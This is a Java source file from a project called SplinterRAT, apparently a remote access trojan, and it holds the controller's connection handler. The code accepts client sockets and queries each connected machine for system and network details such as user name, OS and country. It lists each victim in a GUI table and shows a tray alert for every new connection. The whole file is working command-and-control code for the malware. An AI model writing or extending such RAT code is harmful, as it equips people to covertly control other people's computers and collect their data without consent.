package Connections;

import GUI.Main;
import GUI.Server.ServerGUI;
import Information.Action;
import Information.NetworkInformation;
import Information.SystemInformation;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.sql.SQLOutput;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;

public class Connection implements Runnable {
    private final ServerSocket server;
    private final ExecutorService executor;
    private final ConcurrentHashMap<String, ClientHandler> dialog;
    private static int x;


    public Connection(ServerSocket server, ExecutorService executor, ConcurrentHashMap<String, ClientHandler> dialog) {
        if (server == null || executor == null || dialog == null) throw new IllegalArgumentException();
        this.server = server;
        this.executor = executor;
        this.dialog = dialog;
    }

    @Override
    public void run() {
        try {
            Socket socket = server.accept();
            String clientIP = socket.getInetAddress().toString();
            ClientHandler clientHandler = dialog.get(clientIP);
            if (clientHandler == null) {
                clientHandler = new ClientHandler(socket);
                dialog.put(clientIP, clientHandler);
                System.out.println("Connected to: " + socket.getRemoteSocketAddress());
                Streams mainStream = clientHandler.getMainStream();

                SystemInformation sysInfo = (SystemInformation) mainStream.sendAction(Action.SYS_INFO);
                mainStream.setTempSystemInformation(sysInfo);
                // Network info
                NetworkInformation netInfo = (NetworkInformation) mainStream.sendAction(Action.NET_INFO);
                mainStream.setTempNetworkInformation(netInfo);
                // Change state of JTable add or modify existing client
                SwingUtilities.invokeLater(() -> {
                    System.out.println(socket);
                    TableModel tableModel = Main.gui.getConnectionsTable().getModel();
                    int existingClientRow = getPositionOfExisting(socket, tableModel); // position if exists in JTable
                    if (existingClientRow != -1) {  // change state of connection
                        tableModel.setValueAt("Connected", existingClientRow, 5);
                    } else { // new connection
                        String[] tableRow = new String[]{socket.getInetAddress().toString(),
                                netInfo.USER_COUNTRY(),
                                sysInfo.TAG_NAME(),
                                sysInfo.USER_NAME(),
                                sysInfo.OPERATING_SYSTEM(),
                                "Connected"
                        };
                        DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
                        defaultTableModel.addRow(tableRow);
                    }
                    if (ServerGUI.isNotifications() && SystemTray.isSupported())
                        displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
                    Main.gui.updateNumOfConnectedClients();
                });
            } else {
                Streams operationStream = clientHandler.addStream(socket);
                Streams mainStream = clientHandler.getMainStream();
                operationStream.setTempSystemInformation(mainStream.getTempSystemInformation());
                operationStream.setTempNetworkInformation(mainStream.getTempNetworkInformation());
                System.out.println("Conexion alternativa " + x++);
            }
            // removeExisting(socket);

            // FIXME could be removed?
            executor.submit(new Connection(server, executor, dialog));
        } catch (Exception e) {
            System.out.println("Exception on client");
            e.printStackTrace();
            executor.submit(new Connection(server, executor, dialog));
        }
    }

    public void displayTray(String ip, String operativeSystem) {
        //Obtain only one instance of the SystemTray object
        SystemTray tray = SystemTray.getSystemTray();

        //If the icon is a file
        Image image = new ImageIcon(Objects.requireNonNull(getClass().getClassLoader().getResource("splinter_icon_250x250.png"))).getImage();
        //Alternative (if the icon is on the classpath):
        //Image image = Toolkit.getDefaultToolkit().createImage(getClass().getResource("icon.png"));

        TrayIcon trayIcon = new TrayIcon(image, "SplinterRAT connection!");
        //Let the system resize the image if needed
        trayIcon.setImageAutoSize(true);
        //Set tooltip text for the tray icon
        trayIcon.setToolTip("New connection!");
        try {
            tray.add(trayIcon);
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }

        trayIcon.displayMessage("SplinterRAT has a new connection!", "New connection from " + ip + " - " + operativeSystem, TrayIcon.MessageType.INFO);
    }

    /*
        returns the index where the client is located in the JTable
     */
/*
    private void removeExisting(Socket socket) {
        for (Socket key : dialog.keySet()) {
            if (key.getInetAddress().toString().equals(socket.getInetAddress().toString())) dialog.remove(key);
        }
    }
*/
    private int getPositionOfExisting(Socket socket, TableModel tableModel) {
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            if (socket.getInetAddress().toString().equals(tableModel.getValueAt(i, 0))) {
                return i;
            }
        }
        return -1;
    }


}